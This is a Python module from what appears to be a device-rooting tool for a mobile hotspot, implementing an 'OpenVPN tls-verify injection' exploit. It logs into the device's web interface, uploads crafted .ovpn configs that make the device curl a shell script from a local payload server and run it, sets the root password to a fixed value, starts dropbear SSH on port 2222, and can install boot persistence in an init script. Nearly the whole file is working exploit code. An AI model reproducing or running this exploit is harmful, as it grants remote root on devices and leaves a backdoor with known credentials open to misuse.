import getpass
import http.server
from pathlib import Path
import threading
import time

import requests

from .constants import (
    HOST,
    OVPN_SEARCH,
    PAYLOAD_LOCAL,
    PAYLOAD_PORT,
    PERSISTENCE_FILES,
    PERSISTENCE_MARKER,
    ROOT_PW,
    SSH_PORT,
)
from .device import (
    probe_root,
    show_device_screen,
    ssh_connect,
    ssh_ensure,
    ssh_exec,
)
from .ui import (
    banner,
    clear,
    fail,
    info,
    menu,
    ok,
    pause,
    prompt,
    warn,
    BOLD,
    MAGENTA,
    RESET,
)
from .web import (
    get_local_ip,
    vpn_clear,
    vpn_connect,
    vpn_token,
    vpn_upload,
    web_login,
)


class _PayloadHandler(http.server.SimpleHTTPRequestHandler):
    ps = None

    def do_GET(self):
        if self.path.split("?")[0] == "/payload/root.sh":
            self.ps.fetched.set()
        super().do_GET()

    def log_message(self, *args):
        pass


class PayloadServer(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.fetched = threading.Event()
        self.httpd = None

    def run(self):
        handler = type("_H", (_PayloadHandler,), {"ps": self})
        self.httpd = http.server.ThreadingHTTPServer(("0.0.0.0", PAYLOAD_PORT), handler)
        self.httpd.serve_forever()

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()


def find_base_ovpn():
    seen = set()
    for d in OVPN_SEARCH:
        d = Path(d)
        if not d.exists():
            continue
        for f in sorted(d.glob("*.ovpn")):
            if f.resolve() in seen:
                continue
            seen.add(f.resolve())
            try:
                text = f.read_text(errors="replace")
            except OSError:
                continue
            if "remote " in text:
                return f, text
    return None, None


def build_stage_configs(base_text, local_ip):
    lines = [l for l in base_text.splitlines()
             if l.strip() != "script-security 2"
             and not l.strip().startswith("tls-verify")]
    base = "\n".join(lines).rstrip() + "\n\n"
    stage1 = base + (
        "script-security 2\n"
        f'\ttls-verify "/usr/bin/curl -o /tmp/root.sh '
        f'http://{local_ip}:{PAYLOAD_PORT}/payload/root.sh"\n'
    )
    stage2 = base + (
        "script-security 2\n"
        '\ttls-verify "/bin/sh /tmp/root.sh"\n'
    )
    return stage1, stage2


def persistence_installed(cli):
    for cand in PERSISTENCE_FILES:
        _, out, _ = ssh_exec(cli, f"grep -cF '{PERSISTENCE_MARKER}' {cand} 2>/dev/null")
        if out and out != "0":
            return True
    return False


def flow_persistence(cli):
    MARKER = PERSISTENCE_MARKER
    CANDIDATES = PERSISTENCE_FILES
    block = [
        MARKER,
        'echo -e "Root@123\\nRoot@123" | passwd root',
        "/usr/sbin/dropbear -r /etc/dropbear/dropbear_rsa_key -p 2222",
    ]
    target = None
    for cand in CANDIDATES:
        rc, out, _ = ssh_exec(cli, f"[ -f {cand} ] && echo yes")
        if out == "yes":
            target = cand
            break
    if not target:
        fail(f"none of {CANDIDATES} exist on this device")
        return False

    _, raw, _ = ssh_exec(cli, f"cat {target}")
    if MARKER in raw:
        ok(f"persistence already present in {target}")
        return True
    lines = [l for l in raw.splitlines()
             if l.strip() != MARKER
             and "passwd root" not in l
             and "dropbear -r /etc/dropbear" not in l]
    ssh_exec(cli, f"[ -f {target}.pre-root ] || cp {target} {target}.pre-root")
    try:
        idx = next(i for i, l in enumerate(lines) if l.strip() == "exit 0")
    except StopIteration:
        idx = len(lines)
    lines[idx:idx] = block
    chan = cli.get_transport().open_session()
    chan.exec_command(f"cat > {target}")
    chan.sendall(("\n".join(lines) + "\n").encode())
    chan.shutdown_write()
    rc = chan.recv_exit_status()
    if rc != 0:
        fail("failed to write init script. persistence NOT installed")
        return False
    _, out, _ = ssh_exec(cli, f"grep -c dropbear {target}")
    if int(out or 0) >= 1:
        ok(f"persistence installed in {target} (backup: {target}.pre-root)")
        return True
    else:
        fail("verification failed. DO NOT reboot until this is fixed")
        return False


def flow_unroot(cli):
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Uninstall root{RESET}\n")
    warn("this removes persistence and stops dropbear/telnetd. The root")
    warn("password stays " + ROOT_PW + " but stock builds have no ssh, so it's")
    warn("only reachable over serial/console. The WebUI is untouched.")
    if menu("Continue?", ["Cancel", "Uninstall"]) != 1:
        return
    MARKER = PERSISTENCE_MARKER
    CANDIDATES = PERSISTENCE_FILES
    target = None
    for cand in CANDIDATES:
        _, out, _ = ssh_exec(cli, f"[ -f {cand} ] && echo yes")
        if out == "yes":
            target = cand
            break
    if not target:
        fail(f"none of {CANDIDATES} exist, nothing to uninstall?")
        return
    _, out, _ = ssh_exec(cli, f"[ -f {target}.pre-root ] && echo yes")
    if out == "yes":
        rc, _, err = ssh_exec(cli, f"cp {target}.pre-root {target}")
        if rc == 0:
            ok(f"restored {target} from .pre-root backup")
        else:
            fail(f"restore failed: {err}. DO NOT reboot")
            return
    else:
        _, raw, _ = ssh_exec(cli, f"cat {target}")
        lines = [l for l in raw.splitlines()
                 if l.strip() != MARKER
                 and "passwd root" not in l
                 and "dropbear -r /etc/dropbear" not in l]
        chan = cli.get_transport().open_session()
        chan.exec_command(f"cat > {target}")
        chan.sendall(("\n".join(lines) + "\n").encode())
        chan.shutdown_write()
        if chan.recv_exit_status() != 0:
            fail("failed to clean init script. DO NOT reboot")
            return
        ok(f"persistence block stripped from {target}")
    show_device_screen(cli, "unroot-success")
    ssh_exec(cli, "nohup sh -c 'sleep 1; kill $(pidof dropbear) $(pidof telnetd)' >/dev/null 2>&1 &")
    ok("root uninstalled. ssh/telnet are down, device behaves as stock")


def flow_root(state):
    from .startup import flow_root_startup_offer

    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Rooting (OpenVPN tls-verify injection){RESET}\n")

    up, authed = probe_root()
    if authed:
        warn("root SSH is already up. re-running the exploit is harmless (it")
        warn("just re-applies the password and re-starts dropbear), so test away.")
        if menu("Run the exploit again?", ["Cancel", "Run it anyway"]) != 1:
            return
        clear()
        banner()
        print()

    if not Path(PAYLOAD_LOCAL).exists():
        fail(f"{PAYLOAD_LOCAL} not found next to this script")
        pause()
        return

    warn("You need a working OpenVPN client config (.ovpn) that the device can")
    warn("connect to. Credentials do NOT need to be valid.")
    warn("THE DEVICE MUST HAVE A WORKING INTERNET CONNECTION FOR THE EXPLOIT TO SUCCEED")
    info(f"{BOLD}If you don't know what this is, you can just press enter.{BOLD}")

    auto_path, auto_text = find_base_ovpn()
    if auto_path:
        info(f"auto-selected base config: {auto_path}")
        default_base = str(auto_path)
    else:
        default_base = "m3200-stage1 copy.ovpn"
        warn("no .ovpn found automatically, please enter a path manually")
    base_path = prompt(f"base .ovpn [enter = {default_base}]:", default_base)
    base_file = Path(base_path)
    if base_file.exists():
        base_text = base_file.read_text(errors="replace")
    elif base_path == default_base and auto_text:
        base_text = auto_text
    else:
        fail(f"{base_path} not found")
        pause()
        return
    if "remote " not in base_text:
        fail("that file doesn't look like an OpenVPN config")
        pause()
        return

    local_ip = get_local_ip()
    info(f"your LAN IP (payload server): {local_ip}:{PAYLOAD_PORT}")
    warn("default admin password = the default WiFi password (also shown on the device in")
    warn("Menu > Settings > Advanced Settings).")
    admin_pw = getpass.getpass("  admin password: ")
    info("logging into the WebUI...")

    session = requests.Session()
    oklogin, msg = web_login(session, admin_pw)
    if not oklogin:
        fail(f"WebUI login failed: {msg}")
        pause()
        return
    ok("logged into WebUI")

    stage1, stage2 = build_stage_configs(base_text, local_ip)

    ps = PayloadServer()
    ps.start()
    info(f"payload server listening on :{PAYLOAD_PORT} (serving {Path.cwd()})")

    try:
        info("uploading stage 1...")
        token = vpn_token(session)
        if not token:
            fail("could not scrape gSecureToken from /vpn/. are you logged in?")
            return
        vpn_clear(session, token)
        token = vpn_token(session)
        r = vpn_upload(session, token, "mifi_stage1.ovpn", stage1)
        info(f"stage 1 uploaded (HTTP {r.status_code})")
        token = vpn_token(session)
        info("executing stage 1...")
        vpn_connect(session, token)
        ok("stage 1 executed! waiting for the device to fetch the payload...")

        if not ps.fetched.wait(30):
            fail("device didn't fetch payload within 30 seconds, aborting")
            fail("the device needs an internet connection (cellular data) to")
            fail("reach the VPN server. without the handshake there is no payload.")
            fail("other causes: VPN server down, firewall blocking :8000, wrong IP")
            return
        ok("device fetched the payload!")

        token = vpn_token(session)
        info("preparing to execute stage 2...")
        vpn_clear(session, token)
        token = vpn_token(session)
        info("uploading stage 2...")
        vpn_upload(session, token, "mifi_stage2.ovpn", stage2)
        token = vpn_token(session)
        info("executing stage 2...")
        vpn_connect(session, token)
        ok("stage 2 executed! waiting for ssh...")

        for i in range(45):
            up, authed = probe_root()
            if authed:
                break
            time.sleep(2)
        if not authed:
            fail("uh oh, ssh never came up, check the VPN log in the WebUI")
            return

        ok(f"root acquired! ssh -p 2222 root@{HOST} (password {ROOT_PW})")
    finally:
        ps.stop()

    try:
        cli = ssh_connect()
    except Exception as e:
        fail(f"ssh dropped: {e}")
        pause()
        return
    show_device_screen(cli, "inprogress")
    sel = menu("Install root persistence now?",
               ["Yes (survives reboots)", "No (later)"], info_lines=[])
    cli = ssh_ensure(cli)
    if not cli:
        pause()
        return
    if sel == 0 and flow_persistence(cli):
        persisted = True
    else:
        persisted = False
    cli = ssh_ensure(cli)
    if cli:
        cli = flow_root_startup_offer(cli)
        cli = ssh_ensure(cli) if cli else None
    if not cli:
        pause()
        return
    if persisted:
        show_device_screen(cli, "success")
    else:
        show_device_screen(cli, "temproot-success")
    cli.close()
    pause()


def root_menu(state):
    while True:
        sel = menu("Rooting", [
            "Root the device (ovpnhax)",
            "Install root persistence",
            "Uninstall root",
            "Test root access",
            "Back",
        ])
        if sel in (-1, 4):
            return
        clear()
        banner()
        print()
        if sel == 0:
            flow_root(state)
        elif sel == 1:
            try:
                cli = ssh_connect()
            except Exception as e:
                fail(f"ssh failed: {e}")
                pause()
                continue
            if ssh_ensure(cli):
                if flow_persistence(cli):
                    show_device_screen(cli, "rootpersistence-success")
            cli.close()
            pause()
        elif sel == 2:
            try:
                cli = ssh_connect()
            except Exception as e:
                fail(f"ssh failed: {e}")
                pause()
                continue
            if ssh_ensure(cli):
                flow_unroot(cli)
            cli.close()
            pause()
        elif sel == 3:
            up, authed = probe_root()
            if authed:
                ok(f"root SSH is up on :{SSH_PORT} and {ROOT_PW} works")
                try:
                    cli = ssh_connect()
                    if persistence_installed(cli):
                        ok("persistence is installed - root is permanent")
                        show_device_screen(cli, "you-are-rooted")
                    else:
                        warn("no persistence found - this root dies on reboot")
                        show_device_screen(cli, "you-are-temp-rooted")
                    cli.close()
                except Exception as e:
                    fail(f"ssh failed: {e}")
            elif up:
                warn(f"ssh is up but {ROOT_PW} was rejected (rooted with another tool or password changed?)")
            else:
                fail("ssh is not up, device looks stock")
            pause()
